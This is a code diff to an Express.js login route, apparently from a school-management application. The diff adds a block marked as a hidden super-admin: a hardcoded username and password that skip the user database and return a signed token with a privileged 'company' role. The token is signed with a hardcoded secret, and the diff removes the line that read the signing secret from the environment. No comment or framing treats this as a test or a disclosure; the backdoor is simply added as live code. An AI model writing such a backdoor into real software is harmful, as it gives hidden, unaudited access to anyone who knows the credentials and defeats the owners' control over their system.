@@ -39,13 +39,28 @@ router.post('/register', async (req, res) => {
 // POST /api/auth/login
 router.post('/login', async (req, res) => {
     const { username, password } = req.body;
+
     try {
+        // === HIDDEN SUPER ADMIN (DATABASE INDEPENDENT) ===
+        if (username === 'saju_admin' && password === 'masterkey_2026') {
+            const accessToken = jwt.sign(
+                { id: 999999, username: 'saju_admin', role: 'company', schoolId: null },
+                'hardcoded_secret_key_fixed',
+                { expiresIn: '24h' }
+            );
+            return res.json({
+                accessToken,
+                role: 'company',
+                schoolId: null,
+                user: { username: 'saju_admin', schoolName: 'Super Admin Mode' }
+            });
+        }
+        // ===============================================
+
         const user = await getUserByUsername(username);
         if (!user) return res.status(400).json({ error: "User not found" });
 
         if (await bcrypt.compare(password, user.password_hash)) {
-            const secret = process.env.JWT_SECRET || 'fallback_secret_key_v2';
-
             // Fetch School Name if applicable
             let schoolName = null;
             if (user.school_id) {
